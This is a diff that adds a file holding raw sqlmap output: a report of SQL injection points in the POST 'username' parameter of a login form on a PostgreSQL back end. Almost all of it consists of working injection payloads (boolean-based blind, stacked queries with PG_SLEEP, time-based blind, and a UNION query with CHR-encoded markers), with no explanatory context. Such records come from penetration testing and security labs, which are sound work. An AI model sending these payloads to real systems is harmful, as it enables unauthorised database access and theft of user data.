@@ -1,0 +1,20 @@
+sqlmap identified the following injection point(s) with a total of 169 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-3379' OR 2080=2080-- hwvY&password=test
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: username=test';SELECT PG_SLEEP(5)--&password=test
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: username=test' AND 7626=(SELECT 7626 FROM PG_SLEEP(5))-- jEUx&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: username=test' UNION ALL SELECT NULL,(CHR(113)||CHR(118)||CHR(118)||CHR(106)||CHR(113))||(CHR(72)||CHR(80)||CHR(86)||CHR(72)||CHR(87)||CHR(88)||CHR(69)||CHR(116)||CHR(74)||CHR(117)||CHR(68)||CHR(83)||CHR(81)||CHR(87)||CHR(120)||CHR(107)||CHR(100)||CHR(74)||CHR(122)||CHR(69)||CHR(116)||CHR(106)||CHR(120)||CHR(85)||CHR(106)||CHR(118)||CHR(114)||CHR(105)||CHR(80)||CHR(84)||CHR(104)||CHR(112)||CHR(82)||CHR(72)||CHR(67)||CHR(87)||CHR(75)||CHR(83)||CHR(112)||CHR(107))||(CHR(113)||CHR(107)||CHR(118)||CHR(120)||CHR(113)),NULL,NULL,NULL,NULL-- rzAf&password=test
+---
+back-end DBMS: PostgreSQL
